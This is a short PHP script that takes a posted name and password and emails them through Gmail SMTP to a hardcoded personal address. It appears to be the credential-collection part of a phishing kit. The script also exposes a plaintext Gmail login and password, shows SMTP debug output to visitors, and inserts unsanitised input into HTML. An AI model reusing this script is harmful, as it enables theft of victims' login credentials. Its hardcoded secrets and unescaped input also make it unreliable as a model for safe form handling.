<?php
$name=$_POST["name1"];
$password=$_POST["name2"];
$form_6="
  <h1>New Message from form 6</h1>
  <p><strong>".$name."</strong> ".$password."</p>
";
require_once('../../SMTP.php');
require_once('../../PHPMailer.php');
require_once('../../Exception.php');
use \PHPMailer\PHPMailer\PHPMailer;
use \PHPMailer\PHPMailer\Exception;
$mail=new PHPMailer(true);
try {
  $mail->SMTPDebug=2;
  $mail->isSMTP();
  $mail->Host='smtp.gmail.com';
  $mail->SMTPAuth=true;
  $mail->Username='hardlife777sms@gmail.com'; //login
  $mail->Password='0932992877Sms'; //password
  $mail->SMTPSecure='ssl';
  $mail->Port=465;
  $mail->setFrom('sender@whatever.com', 'Alex sender');
  $mail->addAddress('hardlife777sms@gmail.com'); //recipient
  $mail->isHTML(true);
  $mail->Subject='test'; //subject
  $mail->Body=$form_6; //message
  $mail->send();
  echo 'Message has been sent';
} 
catch(Exception $e) {
  echo 'Message could not be sent.';
  echo 'Mailer Error: '.$mail->ErrorInfo;
}
